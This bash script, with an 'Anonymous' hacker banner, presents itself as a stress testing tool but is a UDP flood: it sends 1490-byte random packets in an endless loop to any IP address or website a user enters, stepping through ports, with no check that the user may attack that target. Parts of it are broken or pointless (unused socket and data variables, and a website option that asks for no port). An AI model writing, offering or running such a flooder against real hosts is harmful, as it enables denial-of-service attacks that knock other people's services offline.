#!/bin/bash

# Color codes for design
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
reset='\033[0m'

# Anonymous Banner
clear
echo -e "${red}█████████${reset}"
echo -e "${red}██${yellow}▀█${reset}${red}███${yellow}▀█${reset}${red}██${reset}"
echo -e "${red}█████████${reset}"
echo -e "${red}██${yellow}▄█${reset}${red}███${yellow}▄█${reset}${red}██${reset}"
echo -e "${red}█████████${reset}"
echo -e "${yellow}Welcome to the Anonymous Stress Testing Tool!${reset}"

# Menu
echo -e "${blue}Select an option:${reset}"
echo -e "${green}1. Stress test an IP Address${reset}"
echo -e "${green}2. Stress test a Web Address${reset}"
echo -e "${green}3. Exit${reset}"

# User Input
read -p "Enter option number: " option

# Function to stress test IP address
stress_test_ip() {
    read -p "Enter IP Address: " ip
    read -p "Enter Port: " port
    echo -e "${yellow}Starting stress test on IP address $ip...${reset}"

    # Socket and random data packet
    sock=$(python3 -c 'import socket; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); print(s)')
    bytes=$(python3 -c 'import random; print(random._urandom(1490))')

    # Loop to send multiple ping requests rapidly
    sent=0
    while true; do
        python3 -c "import socket; import random; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); bytes = random._urandom(1490); s.sendto(bytes, ('$ip', $port))"
        sent=$((sent + 1))
        port=$((port + 1))
        echo -e "${green}[INFO] Sent $sent packet to $ip through port: $port${reset}"
        if [ "$port" -gt 65534 ]; then
            port=1
        fi
        sleep 0.2  # A short delay to simulate rapid pinging
    done
}

# Function to stress test a website
stress_test_website() {
    read -p "Enter Website URL: " website
    ip=$(ping -c 1 "$website" | grep PING | awk '{ print $3 }' | tr -d '()')
    echo -e "${yellow}Resolved $website to IP: $ip${reset}"
    stress_test_ip "$ip"
}

# Handle user input
case $option in
    1)
        stress_test_ip
        ;;
    2)
        stress_test_website
        ;;
    3)
        echo -e "${red}Exiting...${reset}"
        exit 0
        ;;
    *)
        echo -e "${red}Invalid option!${reset}"
        ;;
esac
